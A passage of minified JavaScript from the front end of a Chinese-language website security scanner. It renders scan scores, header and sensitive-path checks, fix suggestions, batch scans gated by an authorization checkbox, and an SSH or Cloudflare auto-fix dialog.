U=P[j-1],Y=d.top+(u-O[j-1].score)/y*h;r.beginPath(),r.arc(U,Y,6,0,Math.PI*2),r.fillStyle=M.color+"40",r.fill(),r.beginPath(),r.arc(U,Y,3.5,0,Math.PI*2),r.fillStyle=M.color,r.fill()}}let I=document.getElementById("trend-legend");if(I){let z="";for(let M=0;M<g.length;M++){let O=Qe(g[M].url);z+='<div style="display:flex;align-items:center;gap:5px;font-size:12px">',z+='<div style="width:10px;height:3px;border-radius:2px;background:'+g[M].color+'"></div>',z+='<span style="color:var(--text-secondary)">'+E(O)+"</span>",z+="</div>"}I.innerHTML=z}}async function Mr(){let e=document.getElementById("public-report-host"),i=document.getElementById("public-report-refresh"),t=e&&e.value||"https://example.com";i&&(i.disabled=!0,i.textContent="扫描中…");let r=document.getElementById("public-report-content");r&&(r.innerHTML='<div style="height:120px;border-radius:2px;margin-top:12px;background:#3c3f41;border:1px solid #555555;display:flex;align-items:center;justify-content:center;color:#808080;font-size:13px">扫描中…</div>');try{let s=await ue("/api/public-demo-scan",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({url:t})}),o=await s.json();s.ok&&o.success?(window._lastScanId=o.scan_id||o.scanId||null,window._lastScanResult=o,Pr(o)):r&&(r.innerHTML='<div style="padding:14px;color:#c75450;font-size:13px">错误：'+E(Qt(Ne(o)))+"</div>")}catch(s){r&&(r.innerHTML='<div style="padding:14px;color:#c75450;font-size:13px">错误：'+E(Qt(s))+"</div>")}finally{i&&(i.disabled=!1,i.textContent="重新扫描")}}function Pr(e){let i=document.getElementById("public-report-content");if(!i)return;let t=e.score||0,r=t>=80?"#73c990":t>=50?"#f0a732":"#c75450",s="#3c3f41",o=e.findings||[],a=e.summary||{high:0,medium:0,low:0},n=[];a.high&&n.push(a.high+" 高风险"),a.medium&&n.push(a.medium+" 中风险"),a.low&&n.push(a.low+" 低风险");let c=e.waf||[],g=c.length?c.map(function(y){return y.name}).join("、"):"未检测到 WAF",v=e.raw_headers||{},d=Object.keys(v),f=[];["strict-transport-security","content-security-policy","x-frame-options","x-content-type-options"].forEach(function(y){d.some(function(b){return b.toLowerCase()===y})||f.push(y)});let h=e.sensitive_paths||[],m="";h.length>0?m=h.slice(0,5).map(function(y){let b=y.exposed?"暴露":"安全";return'<div style="display:flex;align-items:center;justify-content:space-between;padding:4px 8px;font-size:12px;border-bottom:1px solid var(--border)"><code style="color:#a5b4fc">/'+y.path+"</code><span>"+b+"</span></div>"}).join(""):m='<div style="font-size:12px;color:var(--text-secondary);padding:4px">已扫描 '+(e.sensitive_checked||0)+" 个常见敏感路径，未发现暴露</div>";let u="";if(u+='<div style="background:'+s+";border:1px solid #555555;border-left:3px solid "+r+';border-radius:2px;padding:14px;margin-top:12px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px">',u+='<div><div style="font-size:13px;color:var(--text-secondary)">实时扫描结果</div>',e.note&&(u+='<div style="font-size:12px;color:#f0a732;margin-top:2px">'+E(e.note)+"</div>"),u+='<div style="font-size:14px;font-weight:600;margin-top:2px">'+e.final_url+"</div>",u+='<div style="font-size:12px;color:var(--text-secondary);margin-top:2px">HTTPS: '+(e.is_https?"是":"否")+" · WAF: "+g+' · 风险等级: <strong style="color:'+r+'">'+(e.risk_level||"未知")+"</strong></div></div>",u+='<div style="text-align:right"><div style="font-size:32px;font-weight:700;color:'+r+'">'+t+"</div>",u+='<div style="font-size:12px;color:var(--text-secondary)">/ 100 分</div></div>',u+="</div>",e.is_cached&&(u+='<div style="background:#313335;border:1px solid #555555;border-radius:2px;padding:8px 12px;margin-top:8px;font-size:12px;color:#f0a732">'+E(e.note||"当前展示缓存扫描数据")+"</div>"),u+='<div style="display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-top:10px">',u+='<div style="background:var(--bg);border:1px solid var(--border);border-radius:2px;padding:8px;text-align:center"><div style="font-size:18px;font-weight:700;color:#c75450">'+a.high+'</div><div style="font-size:12px;color:var(--text-secondary)">高风险</div></div>',u+='<div style="background:var(--bg);border:1px solid var(--border);border-radius:2px;padding:8px;text-align:center"><div style="font-size:18px;font-weight:700;color:#f0a732">'+a.medium+'</div><div style="font-size:12px;color:var(--text-secondary)">中风险</div></div>',u+='<div style="background:var(--bg);border:1px solid var(--border);border-radius:2px;padding:8px;text-align:center"><div style="font-size:18px;font-weight:700;color:#4b6eaf">'+a.low+'</div><div style="font-size:12px;color:var(--text-secondary)">低风险</div></div>',u+="</div>",u+='<details style="margin-top:12px"><summary style="cursor:pointer;font-size:13px;font-weight:600;padding:6px;background:var(--bg);border-radius:2px">真实证据 1：服务器实际响应头（点击展开）</summary>',u+='<div style="margin-top:6px;background:#0f172a;color:#e2e8f0;border-radius:2px;padding:10px;font-family:monospace;font-size:12px;max-height:200px;overflow-y:auto" class="response-headers-list">',d.slice(0,15).forEach(function(y){let b=String(v[y]);u+='<div class="response-header-row"><span style="color:#a5b4fc" class="response-header-name">'+y+'</span>: <span class="response-header-value">'+E(b)+"</span></div>"}),d.length>15&&(u+='<div style="color:#64748b;margin-top:4px">... 还有 '+(d.length-15)+" 个</div>"),u+="</div></details>",u+='<details style="margin-top:8px" open><summary style="cursor:pointer;font-size:13px;font-weight:600;padding:6px;background:var(--bg);border-radius:2px">真实证据 2：缺失关键安全头（'+f.length+" 个）</summary>",f.length===0?u+='<div style="margin-top:6px;padding:8px;font-size:12px;color:#73c990">关键安全头已全部配置</div>':(u+='<div style="margin-top:6px;padding:8px;font-size:12px">',f.forEach(function(y){u+="缺失: "+y+"<br>"}),u+="</div>"),u+="</details>",u+='<details style="margin-top:8px"><summary style="cursor:pointer;font-size:13px;font-weight:600;padding:6px;background:var(--bg);border-radius:2px">真实证据 3：敏感文件探测</summary>',u+='<div style="margin-top:6px">'+m+"</div></details>",o.length>0&&(u+='<details style="margin-top:8px" open><summary style="cursor:pointer;font-size:13px;font-weight:600;padding:6px;background:var(--bg);border-radius:2px">详细问题列表（'+o.length+" 项）</summary>",u+='<div style="margin-top:6px;max-height:280px;overflow-y:auto">',o.forEach(function(y){let b=y.severity==="high"?"#c75450":y.severity==="medium"?"#f0a732":"#4b6eaf",k=y.severity==="high"?"高":y.severity==="medium"?"中":"低",x=y.fix||y.recommendation||"";u+='<div data-finding-name="'+E(y.name||"")+'" data-severity="'+(y.severity||"low")+'" data-owasp="'+E(y.owasp||"")+'" data-detail="'+E(y.detail||"")+'" data-fix="'+E(x)+'" style="padding:8px;margin-bottom:6px;border-left:3px solid '+b+';background:var(--bg);border-radius:2px">',u+='<div style="display:flex;align-items:center;justify-content:space-between;gap:6px"><div style="font-size:13px;font-weight:600">'+E(y.name||"")+"</div>",u+='<span style="font-size:11px;padding:2px 6px;border-radius:2px;background:'+b+';color:#fff">'+k+"</span>";let z={critical:"P0",high:"P1",medium:"P2",low:"P3"}[y.severity]||"P3",M={P0:"#c75450",P1:"#f0a732",P2:"#f0a732",P3:"#73c990"};u+='<span style="font-size:11px;padding:2px 6px;border-radius:2px;background:#2b2b2b;color:'+M[z]+";font-weight:600;margin-left:6px;border:1px solid "+M[z]+'">'+z+"</span></div>",["sqli","xss","cmdi","traversal","deserialization","ssrf"].indexOf(y.type||"")>=0&&(u+='<div style="margin-top:4px"><span style="font-size:11px;padding:2px 8px;border-radius:2px;background:#2b2b2b;color:#c75450;font-weight:600;border:1px solid #c75450">代码层漏洞</span></div>'),y.owasp&&(u+='<div style="font-size:11px;color:#a5b4fc;margin-top:2px">OWASP: '+y.owasp+"</div>"),y.detail&&(u+='<div style="font-size:12px;color:var(--text-secondary);margin-top:4px">'+E(y.detail)+"</div>"),y.recommendation&&(u+='<div style="font-size:12px;color:#73c990;margin-top:4px">建议：'+E(y.recommendation)+"</div>"),x&&(u+='<details style="margin-top:6px"><summary style="cursor:pointer;font-size:12px;color:var(--primary);font-weight:600">修复建议</summary>',u+='<pre style="margin-top:4px;padding:8px;background:#0f172a;color:#a7f3d0;border-radius:2px;font-size:12px;line-height:1.4;overflow-x:auto;white-space:pre-wrap;word-break:break-all">'+E(x)+"</pre>",u+="</details>"),x&&(y&&y.verify_steps&&y.verify_steps.length>0?(u+='<details style="margin-top:6px"><summary style="cursor:pointer;font-size:12px;color:var(--success);font-weight:600">如何验证修复</summary>',u+='<div style="margin-top:6px;display:flex;flex-direction:column;gap:5px">',y.verify_steps.forEach(function(j,P){u+='<div style="font-size:11px;padding:5px 8px;background:#2b2b2b;border-radius:2px;border-left:2px solid #73c990">',u+='<div style="font-weight:600;color:var(--text-primary)">第'+(P+1)+"步："+E(j.method||"")+"</div>",j.expect&&(u+='<div style="color:var(--text-secondary);margin-top:2px">预期：'+E(j.expect)+"</div>"),u+="</div>"}),u+="</div></details>"):u+='<div style="margin-top:6px;font-size:12px;color:var(--primary)">验证方法：复测后重新扫描该网站，查看此项是否消失或评分是否提升。</div>'),u+='<div style="margin-top:4px;font-size:11px;color:var(--text-secondary)">说明：如认为此项需要复测，可结合修复建议、响应证据和二次扫描结果综合判断。</div>',u+="</div>"}),u+="</div></details>"),e&&e.fixes&&Object.keys(e.fixes).length>0){let y=e.fixes,b={nginx:"Nginx",apache:"Apache",express:"Express",flask:"Flask",spring_boot:"Spring Boot",cloudflare:"Cloudflare",python:"Python",nodejs:"Node.js"},x=["nginx","apache","express","flask","spring_boot","cloudflare","nodejs","python"].filter(function(I){return y[I]&&y[I].length>0});x.length>0&&(u+='<div style="margin-top:12px;padding:14px;border:1px solid #73c990;background:#2b2b2b;border-radius:2px">',u+='<div style="font-size:14px;font-weight:600;margin-bottom:8px;color:#73c990">完整修复建议（'+x.length+" 种平台）</div>",u+='<div style="display:flex;gap:4px;margin-bottom:10px;flex-wrap:wrap">',x.forEach(function(I,z){let M=z===0;u+=`<button onclick="switchPublicFixTab('`+I+`')" id="pub-fix-tab-`+I+'" style="padding:4px 10px;border-radius:2px;border:1px solid '+(M?"var(--success)":"var(--border)")+";background:"+(M?"var(--success)":"transparent")+";color:"+(M?"#fff":"var(--text-secondary)")+';cursor:pointer;font-size:12px">'+b[I]+"</button>"}),u+="</div>",x.forEach(function(I,z){let M=z===0?"block":"none",O=y[I];u+='<div id="pub-fix-pane-'+I+'" style="display:'+M+';max-height:240px;overflow-y:auto;background:#2b2b2b;color:#bbbbbb;padding:10px;border-radius:2px;font-size:12px;line-height:1.5;border:1px solid #555555">',O.forEach(function(j,P){let U=typeof j=="string"?j:j&&j.code?j.code:String(j);u+='<div style="margin-bottom:8px;padding-bottom:8px;border-bottom:1px dashed #555555">',u+='<div style="color:#808080;font-size:11px;margin-bottom:2px"># '+(P+1)+"</div>",u+='<pre style="margin:0;white-space:pre-wrap;word-break:break-all">'+E(U)+"</pre>",u+="</div>"}),u+="</div>"}),u+="</div>")}u+='<div style="margin-top:12px;display:flex;gap:8px;flex-wrap:wrap">',u+=`<button onclick="navigateTo('fixer')" style="background:var(--primary);color:#fff;border:none;padding:8px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:600">用修复器生成补丁</button>`,ve()?u+='<button onclick="doPublicDemoFix()" style="background:var(--primary-dark,#4f46e5);color:#fff;border:none;padding:8px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:600">生成修复配置并预览</button>':u+=`<button onclick="navigateTo('profile')" style="background:var(--bg);color:var(--text);border:1px solid var(--border);padding:8px 14px;border-radius:2px;cursor:pointer;font-size:12px">登录后获取修复配置</button>`,u+="</div>",i.innerHTML=u}function Rr(e){document.querySelectorAll('[id^="pub-fix-pane-"]').forEach(function(r){r.style.display="none"});let i=document.getElementById("pub-fix-pane-"+e);i&&(i.style.display="block"),document.querySelectorAll('[id^="pub-fix-tab-"]').forEach(function(r){r.style.background="transparent",r.style.color="var(--text-secondary)",r.style.border="1px solid var(--border)"});let t=document.getElementById("pub-fix-tab-"+e);t&&(t.style.background="var(--success)",t.style.color="#fff",t.style.border="1px solid var(--success)")}async function Fr(){let e=document.getElementById("public-report-content");if(!e)return;let i=[];if(e.querySelectorAll("[data-finding-name]").forEach(function(t){i.push({name:t.getAttribute("data-finding-name"),severity:t.getAttribute("data-severity")||"low",owasp:t.getAttribute("data-owasp")||"",detail:t.getAttribute("data-detail")||"",fix:t.getAttribute("data-fix")||""})}),i.length===0){F("没有发现需要修复的问题");return}try{if(!(ve()&&window._lastScanId)){if(ve()){let t=document.getElementById("public-report-host")?document.getElementById("public-report-host").value:"https://example.com",r=await ue("/api/scan",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({url:t,depth:"standard",authorized:!0})});if(r.ok){let s=await r.json();window._lastScanId=s.scan_id}}}}catch{}try{let t={findings:i};window._lastScanId&&(t.scan_id=window._lastScanId);let r=await ue("/api/simulate-fix",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(t)}),s=await r.json();if(!r.ok){F("生成修复配置失败");return}en(s)}catch(t){F("网络错误："+(t.message||t))}}function en(e){try{let i=document.getElementById("public-report-content");if(!i)return;if(!e||typeof e!="object"){i.innerHTML='<div class="card"><p style="color:var(--danger)">修复对比数据无效</p></div>';return}let t="";t+='<div style="display:flex;align-items:center;justify-content:space-between;margin-top:8px">',t+='<h3 style="margin:0;font-size:16px">修复效果预览</h3>',t+='<button onclick="loadPublicDemo()" style="background:none;border:1px solid var(--border);color:var(--text);padding:5px 12px;border-radius:2px;cursor:pointer;font-size:12px">← 返回报告</button>',t+="</div>",t+='<div style="background:#3c3f41,rgba(75,110,175,0.08));border:1px solid rgba(16,185,129,0.3);border-radius:2px;padding:14px;margin-top:12px">',t+='<div style="font-size:14px;font-weight:600;color:#73c990">'+e.summary+"</div>",t+="</div>",t+='<div style="display:grid;grid-template-columns:1fr auto 1fr;gap:12px;align-items:center;margin-top:14px">',t+='<div style="text-align:center;background:var(--bg);border:1px solid var(--border);border-radius:2px;padding:14px">',t+='<div style="font-size:12px;color:var(--text-secondary)">复测前</div>',t+='<div style="font-size:36px;font-weight:700;color:#c75450;margin-top:4px">'+e.before_score+"</div>",t+="</div>",t+='<div style="text-align:center;color:#73c990;font-size:24px;font-weight:700">→</div>',t+='<div style="text-align:center;background:rgba(16,185,129,0.08);border:2px solid #73c990;border-radius:2px;padding:14px">',t+='<div style="font-size:12px;color:#73c990">复测后</div>',t+='<div style="font-size:36px;font-weight:700;color:#73c990;margin-top:4px">'+e.after_score+"</div>",t+='<div style="font-size:12px;color:#73c990;margin-top:2px">+ '+e.delta+" 分</div>",t+="</div>",t+="</div>",t+='<h4 style="font-size:14px;margin:14px 0 8px">修复项清单（'+e.fixed_count+" 项）</h4>",t+='<div style="max-height:300px;overflow-y:auto">',e.fixed_items.forEach(function(r,s){let o=r.severity==="high"?"#c75450":r.severity==="medium"?"#f0a732":"#4b6eaf",a=r.severity==="high"?"高":r.severity==="medium"?"中":"低";t+='<div style="display:flex;align-items:flex-start;gap:8px;padding:8px;margin-bottom:6px;background:var(--bg);border-radius:2px;border-left:3px solid '+o+'">',t+='<div style="font-size:14px;font-weight:600;color:#73c990;min-width:24px">'+(s+1)+".</div>",t+='<div style="flex:1"><div style="display:flex;align-items:center;gap:6px"><span style="font-size:12px;font-weight:600">'+E(r.name||"")+"</span>",t+='<span style="font-size:11px;padding:1px 5px;border-radius:2px;background:'+o+';color:#fff">'+a+"</span>",r.owasp&&(t+='<span style="font-size:11px;color:#a5b4fc">'+E(r.owasp)+"</span>"),t+="</div>",r.fix&&(t+='<div style="font-size:12px;color:var(--text-secondary);margin-top:4px;font-family:monospace;background:#0f172a;color:#e2e8f0;padding:6px;border-radius:2px;overflow-x:auto;white-space:pre">'+E(r.fix).substring(0,200)+"</div>"),t+="</div></div>"}),t+="</div>",t+='<div style="margin-top:12px;display:flex;gap:8px;flex-wrap:wrap">',ve()?(t+=`<button onclick="navigateTo('fixer')" style="background:var(--primary);color:#fff;border:none;padding:8px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:600">进入修复器获取完整补丁</button>`,t+=`<button onclick="showAutoFixDialog('`+(window._lastScanId||"")+"', "+(e.fixed_count||0)+')" style="background:#73c990;color:#fff;border:none;padding:8px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:600">应用修复</button>'):t+=`<button onclick="navigateTo('profile')" style="background:var(--primary);color:#fff;border:none;padding:8px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:600">登录后获取完整补丁代码</button>`,t+="</div>",i.innerHTML=t}catch(i){console.error("renderFixComparison error:",i);let t=document.getElementById("public-report-content");t&&(t.innerHTML='<div class="card"><p style="color:var(--danger)">渲染修复对比失败: '+E(i.message||String(i))+"</p></div>")}}function jr(e,i){try{if(document.getElementById("auto-fix-dialog"))return;if(!e){F("请先完成一次扫描");return}let t="";t+='<div style="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.6);z-index:9999;display:flex;align-items:center;justify-content:center;padding:20px" onclick="if(event.target===this)closeAutoFixDialog()">',t+='<div style="background:var(--surface);border-radius:2px;max-width:540px;width:100%;padding:22px;box-shadow:0 20px 60px rgba(0,0,0,0.4)">',t+='<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px">',t+='<h3 style="margin:0;font-size:18px">生成修复配置 '+i+" 项问题</h3>",t+='<button onclick="closeAutoFixDialog()" style="background:none;border:none;font-size:22px;cursor:pointer;color:var(--text-secondary)">×</button>',t+="</div>",t+='<div style="background:rgba(75,110,175,0.08);border:1px solid rgba(75,110,175,0.3);border-radius:2px;padding:12px;margin-bottom:16px;font-size:12px;color:var(--text-secondary)">',t+="<b>安全说明</b>：凭证仅在本请求中使用，不保存到数据库。<br>",t+="<b>修复流程</b>：连接 → 备份 → 写配置 → nginx -t 测试 → reload → 验证头<br>",t+="<b>失败回滚</b>：如 nginx -t 失败，自动停止不会 reload<br>",t+="<b>零停机</b>：用 reload 而非 restart",t+="</div>",t+='<div style="margin-bottom:14px">',t+='<label style="font-size:13px;font-weight:600;display:block;margin-bottom:8px">修复方式</label>',t+='<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">',t+='<label style="background:var(--bg);border:2px solid var(--primary);border-radius:2px;padding:10px;cursor:pointer;text-align:center" id="opt-ssh">',t+='<input type="radio" name="auto-fix-method" value="ssh" checked style="display:none">',t+='<div style="font-size:20px;color:var(--text-secondary)">SSH</div>',t+='<div style="font-size:12px;font-weight:600;margin-top:4px">SSH 登录服务器</div>',t+='<div style="font-size:11px;color:var(--text-secondary)">需服务器 SSH 账号</div>',t+="</label>",t+='<label style="background:var(--bg);border:2px solid var(--border);border-radius:2px;padding:10px;cursor:pointer;text-align:center" id="opt-cf">',t+='<input type="radio" name="auto-fix-method" value="cloudflare" style="display:none">',t+='<div style="font-size:20px;color:var(--text-secondary)">CF</div>',t+='<div style="font-size:12px;font-weight:600;margin-top:4px">Cloudflare API</div>',t+='<div style="font-size:11px;color:var(--text-secondary)">只需 API Token</div>',t+="</label>",t+="</div>",t+="</div>",t+='<div id="ssh-form">',t+='<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px">',t+='<div><label style="font-size:12px;color:var(--text-secondary)">服务器 IP/域名</label><input id="af-host" type="text" placeholder="192.168.1.100" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"></div>',t+='<div><label style="font-size:12px;color:var(--text-secondary)">SSH 端口</label><input id="af-port" type="number" value="22" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"></div>',t+="</div>",t+='<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px">',t+='<div><label style="font-size:12px;color:var(--text-secondary)">SSH 用户名</label><input id="af-user" type="text" value="root" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"></div>',t+='<div><label style="font-size:12px;color:var(--text-secondary)">平台</label><select id="af-platform" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"><option value="nginx">Nginx</option><option value="apache">Apache</option></select></div>',t+="</div>",t+='<div style="margin-bottom:12px"><label style="font-size:12px;color:var(--text-secondary)">SSH 密码 <span style="color:#c75450">*（仅本次使用，不保存）</span></label><input id="af-pass" type="password" placeholder="••••••" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"></div>',t+="</div>",t+='<div id="cf-form" style="display:none">',t+='<div style="margin-bottom:8px"><label style="font-size:12px;color:var(--text-secondary)">Cloudflare API Token</label><input id="af-cf-token" type="password" placeholder="CF Token" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"></div>',t+='<div style="margin-bottom:12px"><label style="font-size:12px;color:var(--text-secondary)">Zone（域名，如 example.com）</label><input id="af-cf-zone" type="text" placeholder="example.com" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"></div>',t+="</div>",t+=`<button onclick="executeAutoFix('`+e+`')" style="width:100%;background:#73c990;color:#fff;border:none;padding:12px;border-radius:2px;cursor:pointer;font-size:14px;font-weight:600;margin-top:8px">生成修复配置并复测</button>`,t+='<div id="af-result" style="margin-top:14px"></div>',t+="</div></div>";let r=document.createElement("div");r.id="auto-fix-dialog",r.innerHTML=t,document.body.appendChild(r),setTimeout(function(){document.querySelectorAll('input[name="auto-fix-method"]').forEach(function(o){o.addEventListener("change",function(){let a=document.getElementById("ssh-form"),n=document.getElementById("cf-form"),c=document.getElementById("opt-ssh"),g=document.getElementById("opt-cf");this.value==="ssh"?(a.style.display="block",n.style.display="none",c.style.borderColor="var(--primary)",g.style.borderColor="var(--border)"):(a.style.display="none",n.style.display="block",c.style.borderColor="var(--border)",g.style.borderColor="var(--primary)")})})},50)}catch(t){console.error("showAutoFixDialog error:",t),F("打开修复配置对话框失败: "+(t.message||String(t)),"error")}}function Hr(){let e=document.getElementById("auto-fix-dialog");e&&e.remove()}async function Nr(e){let i=document.querySelector('input[name="auto-fix-method"]:checked');if(!i){F("请选择修复方式","error");return}let t=i.value,r=document.getElementById("af-result");if(r){r.innerHTML='<div style="background:var(--bg);border-radius:2px;padding:12px;font-size:12px;color:var(--text-secondary)">正在连接服务器并执行修复，请稍候...</div>';try{let s={scan_id:e};if(t==="ssh"){if(s.credentials={host:document.getElementById("af-host").value.trim(),port:parseInt(document.getElementById("af-port").value)||22,username:document.getElementById("af-user").value.trim()||"root",password:document.getElementById("af-pass").value,platform:document.getElementById("af-platform").value},!s.credentials.host||!s.credentials.password){r.innerHTML='<div style="background:#3c3f41;border:1px solid #c75450;border-radius:2px;padding:12px;font-size:12px;color:#c75450">错误：请填写服务器 IP 和密码</div>';return}}else if(s.cf_token=document.getElementById("af-cf-token").value.trim(),s.cf_zone=document.getElementById("af-cf-zone").value.trim(),!s.cf_token||!s.cf_zone){r.innerHTML='<div style="background:#3c3f41;border:1px solid #c75450;border-radius:2px;padding:12px;font-size:12px;color:#c75450">错误：请填写 CF Token 和 Zone</div>';return}let a=await ue(t==="ssh"?"/api/auto-fix":"/api/auto-fix-via-cloudflare",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(s)}),n=await a.json();if(!a.ok||!n.success){r.innerHTML='<div style="background:#3c3f41;border:1px solid #c75450;border-radius:2px;padding:12px;font-size:12px"><b>修复失败</b><br><pre style="margin:6px 0 0;font-size:12px;white-space:pre-wrap">'+E(JSON.stringify(n,null,2))+"</pre></div>";return}let c='<div style="background:rgba(16,185,129,0.1);border:1px solid #73c990;border-radius:2px;padding:12px">';c+='<div style="font-size:14px;font-weight:600;color:#73c990;margin-bottom:8px">修复成功</div>',n.host&&(c+='<div style="font-size:12px;color:var(--text-secondary)">服务器: '+E(n.host)+"</div>"),n.config_path&&(c+='<div style="font-size:12px;color:var(--text-secondary)">配置: '+E(n.config_path)+" ("+n.patch_size_bytes+" 字节)</div>"),n.config_test_ok!==void 0&&(c+='<div style="font-size:12px;color:'+(n.config_test_ok?"#73c990":"#c75450")+'">nginx -t: '+(n.config_test_ok?"配置合法":"配置错误，已停止 reload")+"</div>"),n.verified_headers&&n.verified_headers.length>0&&(c+='<div style="font-size:12px;font-weight:600;margin-top:8px">已验证的安全头：</div>',n.verified_headers.slice(0,6).forEach(function(g){c+='<div style="font-size:11px;font-family:monospace;background:#0f172a;color:#73c990;padding:4px;border-radius:3px;margin-top:2px">'+E(g)+"</div>"})),n.applied!==void 0&&(c+='<div style="font-size:12px;margin-top:8px">Cloudflare: '+n.applied+"/"+n.total+" 头已应用</div>"),c+='<button onclick="closeAutoFixDialog();loadHistory&&loadHistory()" style="width:100%;margin-top:10px;background:var(--primary);color:#fff;border:none;padding:8px;border-radius:2px;cursor:pointer;font-size:12px">完成</button>',c+="</div>",r.innerHTML=c,F("修复配置已应用。已验证 "+(n.verified_headers?n.verified_headers.length:0)+" 个安全头")}catch(s){r.innerHTML='<div style="background:#3c3f41;border:1px solid #c75450;border-radius:2px;padding:12px;font-size:12px">错误：网络错误: '+E(s.message||String(s))+"</div>"}}}function Dr(){if(!ve()){F("请先登录"),_e("profile");return}let e=document.getElementById("batch-scan-modal");e&&(e.style.display="flex");let i=document.getElementById("batch-results");i&&(i.innerHTML="")}function Ur(){let e=document.getElementById("batch-scan-modal");e&&(e.style.display="none")}async function $r(){let e=(document.getElementById("batch-urls").value||"").trim();if(!e){F("请输入至少 1 个 URL");return}let i=e.split(/\r?\n/).map(function(n){return n.trim()}).filter(Boolean);if(i.length>5){F("最多 5 个 URL");return}let t=document.getElementById("batch-auth-check");if(!t||!t.checked){F("请确认你拥有该域名或已获得授权。未经授权的安全扫描可能违反法律法规。");return}let r=document.getElementById("batch-deep"),s=r?r.checked:!1,o=document.getElementById("batch-go-btn");o&&(o.disabled=!0,o.textContent="扫描中…");let a=document.getElementById("batch-results");if(!a){o&&(o.disabled=!1,o.textContent="开始批量扫描");return}a.innerHTML='<div style="text-align:center;padding:20px;color:var(--text-secondary);font-size:13px">正在扫描 '+i.length+" 个目标…</div>";try{let n=await ue("/api/batch-scan",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({urls:i,deep:s,authorized:!0})}),c=await n.json();if(!n.ok){a.innerHTML='<div style="color:#c75450;padding:10px">错误：'+E(Qt(Ne(c)))+"</div>";return}let g='<div style="font-size:13px;font-weight:600;margin-bottom:8px">扫描完成 · '+c.count+" 个目标</div>";c.results.forEach(function(v,d){let f=v.ok?v.score>=80?"#73c990":v.score>=50?"#f0a732":"#c75450":"#808080",h=v.ok?v.score>=80?"rgba(16,185,129,0.1)":v.score>=50?"rgba(240,167,50,0.1)":"rgba(199,84,80,0.1)":"rgba(156,163,175,0.1)";g+='<div style="background:'+h+';border-radius:2px;padding:10px;margin-bottom:8px;display:flex;align-items:center;justify-content:space-between;gap:10px">',g+='<div style="flex:1;min-width:0">',g+='<div style="font-size:12px;color:var(--text-secondary);overflow:hidden;text-overflow:ellipsis;white-space:nowrap">'+(d+1)+". "+v.url+"</div>",v.ok?g+='<div style="font-size:12px;color:var(--text-secondary);margin-top:3px">高 '+v.high+" · 中 "+v.medium+" · 低 "+v.low+"</div>":g+='<div style="font-size:12px;color:#c75450;margin-top:3px">错误：'+(v.error||"失败")+"</div>",g+="</div>",v.ok?g+='<div style="font-size:20px;font-weight:700;color:'+f+'">'+v.score+"</div>":g+='<div style="font-size:12px;color:#808080">无评分</div>',g+="</div>"}),a.innerHTML=g,F("批量扫描完成")}catch(n){a.innerHTML='<div style="color:#c75450;padding:10px">网络错误：'+(n.message||n)+"</div>"}finally{o&&(o.disabled=!1,o.textContent="开始批量扫描")}}function gi(){try{let e=document.getElementById("scan-url"),i=e?e.value.trim():"";if(!i){F("请输入目标网址");return}let t=document.getElementById("auth-check-step1");if(!t||!t.checked){F("请确认你拥有该域名或已获得授权。未经授权的安全扫描可能违反法律法规。");return}try{let o=new Date().toISOString();localStorage.setItem("vs_auth_checked_at",o),ve()&&ue("/api/scan-auth-log",{method:"POST",body:JSON.stringify({authorized_at:o})}).catch(function(){})}catch{}if(/^https?:\/\//i.test(i)||(i="https://"+i,e&&(e.value=i)),!ve()){F("请先登录"),_e("profile");return}let r=document.getElementById("auth-check");if(t&&r&&t.checked){r.checked=!0;let o=document.getElementById("scan-btn");o&&(o.disabled=!1)}let s=document.getElementById("scan-url-confirmed");s&&(s.value=i),ft(),hi()}catch(e){console.error("startScanDirect error:",e),ye=!1,ge("scan-btn",!1),ge("scan-btn-step1",!1),F("扫描启动失败："+(e.message||String(e)))}}function at(){let e=document.getElementById("scan-url"),t=!!(e?e.value.trim():""),r=document.getElementById("auth-check-step1"),s=document.getElementById("auth-check"),o=document.getElementById("scan-btn-step1"),a=document.getElementById("scan-btn"),n=t&&ve(),c=t&&!!(s&&s.checked);o&&(o.disabled=!n),a&&(a.disabled=!c),r&&r.checked&&o&&o.disabled&&(o.disabled=!1)}function ft(){try{at()}catch{}setTimeout(function(){try{at()}catch{}},100),setTimeout(function(){try{at()}catch{}},500)}function qr(e){let i=document.getElementById(e);if(!i)return;let t=i.value,r=document.getElementById(e+"-btn"),s=r?r.textContent:"",o=function(){r&&(r.textContent="已复制",r.style.background="rgba(115,201,144,0.2)",r.style.color="#16a34a",r.style.borderColor="rgba(115,201,144,0.4)",setTimeout(function(){r.textContent=s,r.style.background="rgba(75,110,175,0.1)",r.style.color="#4f46e5",r.style.borderColor="rgba(75,110,175,0.3)"},1500))};if(navigator.clipboard&&window.isSecureContext)navigator.clipboard.writeText(t).then(o).catch(function(){i.select(),document.execCommand("copy"),o()});else{i.select();try{document.execCommand("copy"),o()}catch{F("复制失败，请手动选择")}}}function 